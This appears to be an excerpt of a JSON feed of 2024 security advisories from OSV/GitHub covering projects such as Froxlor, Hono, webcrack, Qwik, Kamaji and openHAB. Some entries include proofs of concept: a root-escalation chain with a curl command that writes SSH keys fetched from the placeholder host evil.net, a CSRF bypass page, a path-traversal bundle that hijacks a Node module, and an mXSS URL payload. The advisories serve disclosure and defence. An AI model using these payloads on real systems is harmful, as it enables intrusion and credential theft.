            "references": "<ul><li>- <a target='_blank' href='https://github.com/jpillora/chisel/security/advisories/GHSA-38jh-8h67-m7mj'>https://github.com/jpillora/chisel/security/advisories/GHSA-38jh-8h67-m7mj</a></li><li>- <a target='_blank' href='https://github.com/jpillora/chisel'>https://github.com/jpillora/chisel</a></li><li>- <a target='_blank' href='https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L138'>https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L138</a></li><li>- <a target='_blank' href='https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L452'>https://github.com/jpillora/chisel/blob/3de177432cd23db58e57f376b62ad497cc10840f/main.go#L452</a></li></ul>"

            "id": "<a href='https://osv.dev/vulnerability/GHSA-34qg-65m4-f23m' target='_blank'>GHSA-34qg-65m4-f23m</a>",
            "details": "<b>Froxlor: &#x2F;etc&#x2F;pure-ftpd&#x2F;db&#x2F;mysql.conf is chmod 644 but contains &amp;lt;SQL_UNPRIVILEGED_PASSWORD&amp;gt;</b><br>### Summary\nIn Froxlor 2.1.9 and in the HEADs of the `main`, `v2.2` and `v2.1` branches , the XML templates in `lib&#x2F;configfiles&#x2F;` set `chmod 644` for `&#x2F;etc&#x2F;pure-ftpd&#x2F;db&#x2F;mysql.conf`, although that file contains `&amp;lt;SQL_UNPRIVILEGED_PASSWORD&amp;gt;`. At least on Debian 12, all parent directories of `&#x2F;etc&#x2F;pure-ftpd&#x2F;db&#x2F;mysql.conf` are world readable by default, thus exposing these credentials to all users with access to the system. Only Froxlor instances configured to use pure-ftpd are affected&#x2F;vulnerable.\n\n### Details\nhttps:&#x2F;&#x2F;github.com&#x2F;froxlor&#x2F;Froxlor&#x2F;blob&#x2F;2.1.9&#x2F;lib&#x2F;configfiles&#x2F;bookworm.xml#L3075\n\n### PoC\nAs non-privileged user:\n```\nnobody@mail:&#x2F;tmp$ grep MYSQLPassword &#x2F;etc&#x2F;pure-ftpd&#x2F;db&#x2F;mysql.conf\nMYSQLPassword   MySecretMySQLPasswordForFroxlor\n```\n\n\n### Impact\nAny unprivileged user with &quot;command&#x2F;code execution&quot; access to the system can trivially obtain the credentials granting access to the `froxlor` MySQL database. This holds true even for virtual users without SSH access as long as they are able to upload their own PHP scripts or other CGIs, and works even if the admin has setup a separate php-fpm pool that runs as their own user.\n\nSide note: This access to the database can be leveraged to obtain Froxlor admin privileges, and subsequently root privileges. For example:\n1. Use the database credentials to extract or change a Froxlor admin&#x27;s password hash and TOTP seed value.\n2. Log into Froxlor as that admin.\n3. Set the `Cron-daemon reload command` in `&#x2F;admin_settings.php?page=overview&amp;part=crond` to something like `curl -o &#x2F;root&#x2F;.ssh&#x2F;authorized_keys evil.net`.\n4. Wait a few minutes until the relevant cronjob runs, then log in via SSH.\n\n\nPlease consider using passwordless unix socket authentication. Current versions of MySQL, MariaDB and Percona allow completely removing&#x2F;omitting database passwords for database connections going through a unix socket, this works even for use cases where the database user has a different name than the system account running the database client:\nhttps:&#x2F;&#x2F;dev.mysql.com&#x2F;doc&#x2F;refman&#x2F;5.7&#x2F;en&#x2F;socket-pluggable-authentication.html",
            "published": "2024-08-23T18:54:30Z",
            "severity": "7.3",
            "langs": "xml",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/froxlor/Froxlor/security/advisories/GHSA-34qg-65m4-f23m'>https://github.com/froxlor/Froxlor/security/advisories/GHSA-34qg-65m4-f23m</a></li><li>- <a target='_blank' href='https://github.com/froxlor/Froxlor/commit/5d2ce4ecfb0e9c397ef5c73b107fb9a0e122e910'>https://github.com/froxlor/Froxlor/commit/5d2ce4ecfb0e9c397ef5c73b107fb9a0e122e910</a></li><li>- <a target='_blank' href='https://github.com/froxlor/Froxlor'>https://github.com/froxlor/Froxlor</a></li><li>- <a target='_blank' href='https://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075'>https://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075</a></li></ul>"

            "details": "<b>memos CORS Misconfiguration in server.go (GHSL-2024-034)</b><br>memos is a privacy-first, lightweight note-taking service. A CORS misconfiguration exists in memos 0.20.1 and earlier where an arbitrary origin is reflected with Access-Control-Allow-Credentials set to true. This may allow an attacking website to make a cross-origin request, allowing the attacker to read private information or make privileged changes to the system as the vulnerable user account.",

            "details": "<b>Casdoor CORS misconfiguration (GHSL-2024-035)</b><br>Casdoor is a UI-first Identity and Access Management (IAM) &#x2F; Single-Sign-On (SSO) platform. In Casdoor 1.577.0 and earlier, a logic vulnerability exists in the beego filter CorsFilter that allows any website to make cross domain requests to Casdoor as the logged in user. Due to the a logic error in checking only for a prefix when authenticating the Origin header, any domain can create a valid subdomain with a valid subdomain prefix (Ex: localhost.example.com), allowing the website to make requests to Casdoor as the current signed-in user.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-rpfr-3m35-5vx5' target='_blank'>GHSA-rpfr-3m35-5vx5</a>",
            "details": "<b>Hono CSRF middleware can be bypassed using crafted Content-Type header</b><br>### Summary\n\nHono CSRF middleware can be bypassed using crafted Content-Type header.\n\n### Details\n\nMIME types are case insensitive, but `isRequestedByFormElementRe` only matches lower-case.\n\nhttps:&#x2F;&#x2F;github.com&#x2F;honojs&#x2F;hono&#x2F;blob&#x2F;b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0&#x2F;src&#x2F;middleware&#x2F;csrf&#x2F;index.ts#L16-L17\n\nAs a result, attacker can bypass csrf middleware using upper-case form-like MIME type, such as &quot;Application&#x2F;x-www-form-urlencoded&quot;.\n\n### PoC\n\n```html\n&amp;lt;html&amp;gt;\n  &amp;lt;head&amp;gt;\n    &amp;lt;title&amp;gt;CSRF Test&amp;lt;&#x2F;title&amp;gt;\n    &amp;lt;script defer&amp;gt;\n      document.addEventListener(&quot;DOMContentLoaded&quot;, () =&amp;gt; {\n        document.getElementById(&quot;btn&quot;).addEventListener(&quot;click&quot;, async () =&amp;gt; {\n          const res = await fetch(&quot;http:&#x2F;&#x2F;victim.example.com&#x2F;test&quot;, {\n            method: &quot;POST&quot;,\n            credentials: &quot;include&quot;,\n            headers: {\n              &quot;Content-Type&quot;: &quot;Application&#x2F;x-www-form-urlencoded&quot;,\n            },\n          });\n        });\n      });\n    &amp;lt;&#x2F;script&amp;gt;\n  &amp;lt;&#x2F;head&amp;gt;\n  &amp;lt;body&amp;gt;\n    &amp;lt;h1&amp;gt;CSRF Test&amp;lt;&#x2F;h1&amp;gt;\n    &amp;lt;button id=&quot;btn&quot;&amp;gt;Click me!&amp;lt;&#x2F;button&amp;gt;\n  &amp;lt;&#x2F;body&amp;gt;\n&amp;lt;&#x2F;html&amp;gt;\n```\n\n### Impact\n\nBypass csrf protection implemented with hono csrf middleware.\n\n### Discussion\n\nI&#x27;m not sure that omitting csrf checks for Simple POST request is a good idea.\nCSRF prevention and CORS are different concepts even though CORS can prevent CSRF in some cases.\n",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-h27c-6xm3-mcqp' target='_blank'>GHSA-h27c-6xm3-mcqp</a>",
            "details": "<b>Kanister vulnerable to cluster-level privilege escalation</b><br>### Details\nThe kanister has a deployment called default-kanister-operator, which is bound with a ClusterRole called edit via ClusterRoleBinding(https:&#x2F;&#x2F;github.com&#x2F;kanisterio&#x2F;kanister&#x2F;blob&#x2F;master&#x2F;helm&#x2F;kanister-operator&#x2F;templates&#x2F;rbac.yaml#L49). The &quot;edit&quot; ClusterRole is one of Kubernetes default-created ClusterRole, and it have create&#x2F;patch&#x2F;udpate verbs of daemonset resources, create verb of serviceaccount&#x2F;token resources, and impersonate verb of serviceaccounts resources. If a malicious user can access the worker node which has this component, he&#x2F;she can:\n\nFor the create&#x2F;patch&#x2F;update verbs of daemonset resources, the malicious user can abuse it to create or modify a set of Pods to mount a high-privilege service account (e.g., the cluster-admin service account). After that, he&#x2F;she can abuse the high-privilege SA token of created Pod to take over the whole cluster.\n\nFor the create verb of serviceaccount&#x2F;token resources, a malicious user can abuse this permission to generate new Service Account tokens and use them to operate with high-privilege roles, such as cluster administrators. These tokens can be used to access and manipulate any resources within the cluster.\n\nFor the impersonate verb of serviceaccounts resources, a malicious user can impersonate high-privilege Service Accounts, thereby gaining access to roles such as cluster administrators. This enables the attacker to perform all actions that the high-privilege account can, including creating, modifying, and deleting critical resources within the cluster.\n\n\n### PoC\nWe have discussed in the &quot;Details&quot; section\n\n### Impact\nPrivilege escalation\n\n### Mitigation\n\nCurrently kanister helm chart provides rbac.create flag (true by default), which controls whether the rbac rules for kanister service account will be created https:&#x2F;&#x2F;github.com&#x2F;kanisterio&#x2F;kanister&#x2F;blob&#x2F;master&#x2F;helm&#x2F;kanister-operator&#x2F;values.yaml#L17\nIf this value set to false, the user needs to create rbac rules themselves and they can limit the role bindings for kanister service account, for example scope it to specific namespace.\nService account can also be configured via helm https:&#x2F;&#x2F;github.com&#x2F;kanisterio&#x2F;kanister&#x2F;blob&#x2F;master&#x2F;helm&#x2F;kanister-operator&#x2F;values.yaml#L19\n",
            "published": "2024-08-20T22:13:02Z",
            "severity": "8.8",
            "langs": "yaml",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/kanisterio/kanister/security/advisories/GHSA-h27c-6xm3-mcqp'>https://github.com/kanisterio/kanister/security/advisories/GHSA-h27c-6xm3-mcqp</a></li><li>- <a target='_blank' href='https://github.com/kanisterio/kanister'>https://github.com/kanisterio/kanister</a></li><li>- <a target='_blank' href='https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49'>https://github.com/kanisterio/kanister/blob/master/helm/kanister-operator/templates/rbac.yaml#L49</a></li><li>- <a target='_blank' href='https://github.com/kanisterio/kanister/wiki/2023%E2%80%9024-Community-Meeting-Notes'>https://github.com/kanisterio/kanister/wiki/2023%E2%80%9024-Community-Meeting-Notes</a></li></ul>"

            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-41659' target='_blank'>CVE-2024-41659</a>",
            "details": "<b></b><br>memos is a privacy-first, lightweight note-taking service. A CORS misconfiguration exists in memos 0.20.1 and earlier where an arbitrary origin is reflected with Access-Control-Allow-Credentials set to true. This may allow an attacking website to make a cross-origin request, allowing the attacker to read private information or make privileged changes to the system as the vulnerable user account. This vulnerability is fixed in 0.21.0.",

        }, {
            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-43373' target='_blank'>CVE-2024-43373</a>",
            "details": "<b></b><br>webcrack is a tool for reverse engineering javascript. An arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system. This vulnerability allows an attacker to write arbitrary `.js` files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution. This vulnerability has been patched in version 2.14.1.",
            "published": "2024-08-15T15:15:21Z",
            "severity": "7.8",
            "langs": "ts",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w'>https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w</a></li><li>- <a target='_blank' href='https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79'>https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79</a></li></ul>"
        }, {
            "ecosystem": "npm",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-ccqh-278p-xq6w' target='_blank'>GHSA-ccqh-278p-xq6w</a>",
            "details": "<b>webcrack has an Arbitrary File Write Vulnerability on Windows when Parsing and Saving a Malicious Bundle</b><br>### Summary\nAn arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system.\n\n### Details\n\nSource: [packages&#x2F;webcrack&#x2F;src&#x2F;unpack&#x2F;bundle.ts#L79](https:&#x2F;&#x2F;github.com&#x2F;j4k0xb&#x2F;webcrack&#x2F;blob&#x2F;241f9469e6401f3dabc6373233d85a5e76966b54&#x2F;packages&#x2F;webcrack&#x2F;src&#x2F;unpack&#x2F;bundle.ts#L79)\n```ts\nimport { posix } from &#x27;node:path&#x27;;\nimport type { Module } from &#x27;.&#x2F;module&#x27;;\n\n&#x2F;&#x2F; eslint-disable-next-line @typescript-eslint&#x2F;unbound-method\nconst { dirname, join, normalize } = posix;\n\n&#x2F;* ... snip ... *&#x2F;\n\nconst modulePath = normalize(join(path, module.path));\nif (!modulePath.startsWith(path)) {\n    throw new Error(`detected path traversal: ${module.path}`);\n}\nawait mkdir(dirname(modulePath), {\n    recursive: true\n});\nawait writeFile(modulePath, module.code, &#x27;utf8&#x27;);\n```\n\nIn this code, the application explicitly relies on the POSIX version of path utilities (`dirname`, `join`, `normalize`) from Node.js. However, the vulnerability arises because the POSIX version of the `normalize` function does not recognize `\\` as a path separator. As a result, on Windows systems, the path traversal check fails, allowing an attacker to write files to unintended locations.\n\n### PoC\nThe following proof of concept demonstrates how this vulnerability can be exploited to overwrite and hijack the `debug` module in Node.js:\n\n**Malicious Script (what.js):**\n\n```js\n(function (e) {\n    var n = {};\n    function o(r) {\n      if (n[r]) {\n        return n[r].exports;\n      }\n      var a = (n[r] = {\n        i: r,\n        l: false,\n        exports: {},\n      });\n      e[r].call(a.exports, a, a.exports, o);\n      a.l = true;\n      return a.exports;\n    }\n    o.p = &#x27;&#x27;;\n    o((o.s = 386));\n  })({\n    &#x27;.&#x2F;\\\\..\\\\node_modules\\\\debug\\\\src\\\\index&#x27;: function (e, t, n) {\n        module.exports = () =&amp;gt; console.log(&quot;pwned&quot;)\n    },\n  });\n```\n\n**Webcrack Script (index.js):**\n\n```js\nimport fs from &#x27;fs&#x27;;\nimport { webcrack } from &#x27;webcrack&#x27;;\n\nconst input = fs.readFileSync(&#x27;what.js&#x27;, &#x27;utf8&#x27;);\n\nconst result = await webcrack(input);\nconsole.log(result.code);\nconsole.log(result.bundle);\nawait result.save(&#x27;output-dir&#x27;);\n```\n\n**Execution:**\nRunning the above script with `node index.js` twice results in the following output being printed to the terminal:\n\n```\nPS C:\\Webcrack&amp;gt; node .\\index.js\nDebugger attached.\n(function (e) {\n  var n = {};\n  function o(r) {\n    if (n[r]) {\n      return n[r].exports;\n    }\n    var a = n[r] = {\n      i: r,\n      l: false,\n      exports: {}\n    };\n    e[r].call(a.exports, a, a.exports, o);\n    a.l = true;\n    return a.exports;\n  }\n  o.p = &quot;&quot;;\n  o(o.s = 386);\n})({\n  &quot;.&#x2F;\\\\..\\\\node_modules\\\\debug\\\\src\\\\index&quot;: function (e, t, n) {\n    module.exports = () =&amp;gt; console.log(&quot;pwned&quot;);\n  }\n});\nWebpackBundle {\n  type: &#x27;webpack&#x27;,\n  entryId: &#x27;386&#x27;,\n  modules: Map(1) {\n    &#x27;.&#x2F;\\\\..\\\\node_modules\\\\debug\\\\src\\\\index&#x27; =&amp;gt; WebpackModule {\n      id: &#x27;.&#x2F;\\\\..\\\\node_modules\\\\debug\\\\src\\\\index&#x27;,\n      isEntry: false,\n      path: &#x27;.&#x2F;.&#x2F;\\\\..\\\\node_modules\\\\debug\\\\src\\\\index.js&#x27;,\n      ast: [Object]\n    }\n  }\n}\nWaiting for the debugger to disconnect...\nPS C:\\Webcrack&amp;gt; node .\\index.js\nDebugger attached.\npwned\npwned\npwned\npwned\npwned\npwned\npwned\nWaiting for the debugger to disconnect...\nfile:&#x2F;&#x2F;&#x2F;C:&#x2F;Webcrack&#x2F;node_modules&#x2F;webcrack&#x2F;dist&#x2F;index.js:444\n  if (options.log) logger(`${name}: started`);\n                   ^\n\nTypeError: logger is not a function\n    at applyTransforms (file:&#x2F;&#x2F;&#x2F;C:&#x2F;Webcrack&#x2F;node_modules&#x2F;webcrack&#x2F;dist&#x2F;index.js:444:20)\n    at Array.&amp;lt;anonymous&amp;gt; (file:&#x2F;&#x2F;&#x2F;C:&#x2F;Webcrack&#x2F;node_modules&#x2F;webcrack&#x2F;dist&#x2F;index.js:4259:7)\n    at webcrack (file:&#x2F;&#x2F;&#x2F;C:&#x2F;Webcrack&#x2F;node_modules&#x2F;webcrack&#x2F;dist&#x2F;index.js:4292:20)\n    at async file:&#x2F;&#x2F;&#x2F;C:&#x2F;Webcrack&#x2F;index.js:6:16\n\nNode.js v18.16.0\n```\n\nThis demonstrates that the debug module was successfully overwritten and hijacked to print `pwned` to the console, confirming the arbitrary file write vulnerability has lead to code execution.\n\n### Impact\nThis vulnerability allows an attacker to write arbitrary `.js` files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution.\n",

        }, {
            "ecosystem": "Go",

            "details": "<b>RBAC Roles for `etcd` created by Kamaji are not disjunct</b><br>### Summary\n_Using an &quot;open at the top&quot; range definition in RBAC for etcd roles leads to some TCPs API servers being able to read, write and delete the data of other control planes._\n\n### Details\n\nThe problematic code is this: https:&#x2F;&#x2F;github.com&#x2F;clastix&#x2F;kamaji&#x2F;blob&#x2F;8cdc6191242f80d120c46b166e2102d27568225a&#x2F;internal&#x2F;datastore&#x2F;etcd.go#L19-L24\n\nThe range created by this RBAC setup code looks like this:\n\n```\netcdctl role get example\nRole example\nKV Read:\n\t[&#x2F;example&#x2F;, \\0)\nKV Write:\n\t[&#x2F;example&#x2F;, \\0)\n```\n\nThe range end `\\0` means &quot;everything that comes after&quot; in etcd, so potentially all the key prefixes of controlplanes with a name that comes after &quot;example&quot; when sorting lexically (e.g. `example1`, `examplf`, all the way to `zzzzzzz` if you will).\n\n### PoC\n\n1. Create two TCP in the same Namespace\n2. Scale Kamaji to zero to avoid reconciliations\n3. change the Kubernetes API Server `--etcd-prefix` flag value  to point to the other TCP datastore key\n4. wait it for get it up and running\n5. use `kubectl` and will notice you&#x27;re reading and writing data of another Tenant\n\n### Impact\n\nFull control over other TCPs data, if you are able to obtain the name of other TCPs that use the same datastore and are able to obtain the user certificates used by your control plane (or you are able to configure the kube-apiserver Deployment, as shown in the PoC).\n",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-42467' target='_blank'>CVE-2024-42467</a>",
            "details": "<b></b><br>openHAB, a provider of open-source home automation software, has add-ons including the visualization add-on CometVisu. Prior to version 4.2.1, the proxy endpoint of openHAB&#x27;s CometVisu add-on can be accessed without authentication. This proxy-feature can be exploited as Server-Side Request Forgery (SSRF) to induce GET HTTP requests to internal-only servers, in case openHAB is exposed in a non-private network. Furthermore, this proxy-feature can also be exploited as a Cross-Site Scripting (XSS) vulnerability, as an attacker is able to re-route a request to their server and return a page with malicious JavaScript code. Since the browser receives this data directly from the openHAB CometVisu UI, this JavaScript code will be executed with the origin of the CometVisu UI. This allows an attacker to exploit call endpoints on an openHAB server even if the openHAB server is located in a private network. (e.g. by sending an openHAB admin a link that proxies malicious JavaScript.) This issue may lead up to Remote Code Execution (RCE) when chained with other vulnerabilities. Users should upgrade to version 4.2.1 of the CometVisu add-on of openHAB to receive a patch.",

            "details": "<b></b><br>aiohttp is an asynchronous HTTP client&#x2F;server framework for asyncio and Python. Prior to version 3.10.2, static routes which contain files with compressed variants (`.gz` or `.br` extension) are vulnerable to path traversal outside the root directory if those variants are symbolic links. The server protects static routes from path traversal outside the root directory when `follow_symlinks=False` (default).  It does this by resolving the requested URL to an absolute path and then checking that path relative to the root. However, these checks are not performed when looking for compressed variants in the `FileResponse` class, and symbolic links are then automatically followed when performing the `Path.stat()` and `Path.open()` to send the file. Version 3.10.2 contains a patch for the issue.",

            "details": "<b>CometVisu Backend for openHAB has a path traversal vulnerability</b><br>openHAB&#x27;s [CometVisuServlet](https:&#x2F;&#x2F;github.com&#x2F;openhab&#x2F;openhab-webui&#x2F;blob&#x2F;1c03c60f84388b9d7da0231df2d4ebb1e17d3fcf&#x2F;bundles&#x2F;org.openhab.ui.cometvisu&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openhab&#x2F;ui&#x2F;cometvisu&#x2F;internal&#x2F;servlet&#x2F;CometVisuServlet.java#L75) is susceptible to an unauthenticated path traversal vulnerability.\n\nLocal files on the server can be requested via HTTP GET on the CometVisuServlet.\n\nThis vulnerability was discovered with the help of CodeQL&#x27;s [Uncontrolled data used in path expression](https:&#x2F;&#x2F;codeql.github.com&#x2F;codeql-query-help&#x2F;java&#x2F;java-path-injection&#x2F;) query.\n\n## Impact\n\nThis issue may lead to Information Disclosure.\n",

            "details": "<b>CometVisu Backend for openHAB affected by SSRF&#x2F;XSS</b><br>The [proxy endpoint](https:&#x2F;&#x2F;github.com&#x2F;openhab&#x2F;openhab-webui&#x2F;blob&#x2F;1c03c60f84388b9d7da0231df2d4ebb1e17d3fcf&#x2F;bundles&#x2F;org.openhab.ui.cometvisu&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openhab&#x2F;ui&#x2F;cometvisu&#x2F;internal&#x2F;backend&#x2F;rest&#x2F;ProxyResource.java#L83) of openHAB&#x27;s CometVisu add-on can be accessed without authentication. This proxy-feature can be exploited as Server-Side Request Forgery (SSRF) to induce GET HTTP requests to internal-only servers, in case openHAB is exposed in a non-private network.\n\nFurthermore, this proxy-feature can also be exploited as a Cross-Site Scripting (XSS) vulnerability, as an attacker is able to re-route a request to their server and return a page with malicious JavaScript code. Since the browser receives this data directly from the openHAB CometVisu UI, this JavaScript code will be executed with the origin of the CometVisu UI. This allows an attacker to exploit call endpoints on an openHAB server even if the openHAB server is located in a private network. (e.g. by sending an openHAB admin a link that proxies malicious JavaScript.)\n\nThis vulnerability was discovered with the help of CodeQL&#x27;s [Server-side request forgery](https:&#x2F;&#x2F;codeql.github.com&#x2F;codeql-query-help&#x2F;java&#x2F;java-ssrf&#x2F;) query.\n\n## Impact\n\nThis issue may lead up to Remote Code Execution (RCE) when chained with other vulnerabilities (see: GHSL-2024-007).",

            "details": "<b>In aiohttp, compressed files as symlinks are not protected from path traversal</b><br>### Summary\nStatic routes which contain files with compressed variants (`.gz` or `.br` extension) were vulnerable to path traversal outside the root directory if those variants are symbolic links.\n\n### Details\nThe server protects static routes from path traversal outside the root directory when `follow_symlinks=False` (default).  It does this by resolving the requested URL to an absolute path and then checking that path relative to the root.  However, these checks are not performed when looking for compressed variants in the `FileResponse` class, and symbolic links are then automatically followed when performing `Path.stat()` and `Path.open()` to send the file.\n\n### Impact\nServers with static routes that contain compressed variants as symbolic links, pointing outside the root directory, or that permit users to upload or create such links, are impacted.\n\n----\n\nPatch: https:&#x2F;&#x2F;github.com&#x2F;aio-libs&#x2F;aiohttp&#x2F;pull&#x2F;8653&#x2F;files",

            "details": "<b>Pulp incorrectly assigns RBAC permissions in tasks that create objects</b><br>A flaw was found in the Pulp package. When a role-based access control (RBAC) object in Pulp is set to assign permissions on its creation, it uses the `AutoAddObjPermsMixin` (typically the add_roles_for_object_creator method). This method finds the object creator by checking the current authenticated user. For objects that are created within a task, this current user is set by the first user with any permissions on the task object. This means the oldest user with model&#x2F;domain-level task permissions will always be set as the current user of a task, even if they didn&#x27;t dispatch the task. Therefore, all objects created in tasks will have their permissions assigned to this oldest user, and the creating user will receive nothing.",

            "details": "<b>Qwik has a potential mXSS vulnerability due to improper HTML escaping</b><br>### Summary\n\nA potential mXSS vulnerability exists in Qwik for versions up to 1.6.0.\n\n### Details\n\nQwik improperly escapes HTML on server-side rendering. It converts strings according to the following rules:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;QwikDev&#x2F;qwik&#x2F;blob&#x2F;v1.5.5&#x2F;packages&#x2F;qwik&#x2F;src&#x2F;core&#x2F;render&#x2F;ssr&#x2F;render-ssr.ts#L1182-L1208\n\n- If the string is an attribute value:\n    - `&quot;` -&amp;gt; `&amp;quot;`\n    - `&amp;` -&amp;gt; `&amp;amp;`\n    - Other characters -&amp;gt; No conversion\n- Otherwise:\n    - `&amp;lt;` -&amp;gt; `&amp;lt;`\n    - `&amp;gt;` -&amp;gt; `&amp;gt;`\n    - `&amp;` -&amp;gt; `&amp;amp;`\n    - Other characters -&amp;gt; No conversion\n\nIt sometimes causes the situation that the final DOM tree rendered on browsers is different from what Qwik expects on server-side rendering. This may be leveraged to perform XSS attacks, and a type of the XSS is known as mXSS (mutation XSS).\n\n## PoC\n\nA vulnerable component:\n```javascript\nimport { component$ } from &quot;@builder.io&#x2F;qwik&quot;;\nimport { useLocation } from &quot;@builder.io&#x2F;qwik-city&quot;;\n\nexport default component$(() =&amp;gt; {\n  \n  &#x2F;&#x2F; user input\n  const { url } = useLocation();\n  const href = url.searchParams.get(&quot;href&quot;) ?? &quot;https:&#x2F;&#x2F;example.com&quot;;\n\n  return (\n    &amp;lt;div&amp;gt;\n      &amp;lt;noscript&amp;gt;\n        &amp;lt;a href={href}&amp;gt;test&amp;lt;&#x2F;a&amp;gt;\n      &amp;lt;&#x2F;noscript&amp;gt;\n    &amp;lt;&#x2F;div&amp;gt;\n  );\n});\n```\n\nIf a user accesses the following URL,\n```\nhttp:&#x2F;&#x2F;localhost:4173&#x2F;?href=&amp;lt;&#x2F;noscript&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;&#x2F;script&amp;gt;\n```\nthen, `alert(123)` will be executed.\n\n### Impact\n\nXSS",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-41677' target='_blank'>CVE-2024-41677</a>",
            "details": "<b></b><br>Qwik is a performance focused javascript framework. A potential mutation XSS vulnerability exists in Qwik for versions up to but not including 1.6.0. Qwik improperly escapes HTML on server-side rendering. It converts strings according to the rules found in the `render-ssr.ts` file. It sometimes causes the situation that the final DOM tree rendered on browsers is different from what Qwik expects on server-side rendering. This may be leveraged to perform XSS attacks, and a type of the XSS is known as mXSS (mutation XSS). This has been resolved in qwik version 1.6.0 and @builder.io&#x2F;qwik version 1.7.3. All users are advised to upgrade. There are no known workarounds for this vulnerability.",

        }, {

            "id": "<a href='https://osv.dev/vulnerability/GHSA-2jch-qc96-9f5g' target='_blank'>GHSA-2jch-qc96-9f5g</a>",
            "details": "<b>Flowise Cross-site Scripting in api&#x2F;v1&#x2F;chatflows&#x2F;id</b><br>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the `api&#x2F;v1&#x2F;chatflows&#x2F;id` endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text&#x2F;html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.",

            "details": "<b>Flowise Cross-site Scripting in &#x2F;api&#x2F;v1&#x2F;chatflows-streaming&#x2F;id</b><br>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the `&#x2F;api&#x2F;v1&#x2F;chatflows-streaming&#x2F;id` endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text&#x2F;html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.",

            "details": "<b>Owncast Path Traversal vulnerability</b><br>Owncast is an open source, self-hosted, decentralized, single user live video streaming and chat server. The Owncast application exposes an administrator API at the URL &#x2F;api&#x2F;admin. The emoji&#x2F;delete endpoint of said API allows administrators to delete custom emojis, which are saved on disk. The parameter name is taken from the JSON request and directly appended to the filepath that points to the emoji to delete. By using path traversal sequences (..&#x2F;), attackers with administrative privileges can exploit this endpoint to delete arbitrary files on the system, outside of the emoji directory. This vulnerability is fixed in 0.1.3.",

            "details": "<b>XXL-RPC Deserialization of Untrusted Data vulnerability</b><br>XXL-RPC is a high performance, distributed RPC framework. With it, a TCP server can be set up using the Netty framework and the Hessian serialization mechanism. When such a configuration is used, attackers may be able to connect to the server and provide malicious serialized objects that, once deserialized, force it to execute arbitrary code. This can be abused to take control of the machine the server is running by way of remote code execution. This issue has not been fixed.",

            "details": "<b>Scrypted Cross-site Scripting vulnerability</b><br>Scrypted is a home video integration and automation platform. In versions 0.55.0 and prior (corresponding to `@scrypted&#x2F;core` 0.1.142 and prior), a reflected cross-site scripting vulnerability exists in the login page via the `redirect_uri` parameter. By specifying a url with the javascript scheme (`javascript:`), an attacker can run arbitrary JavaScript code after the login. As of time of publication, no known patches are available.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-p78h-m8pv-g9gm' target='_blank'>GHSA-p78h-m8pv-g9gm</a>",
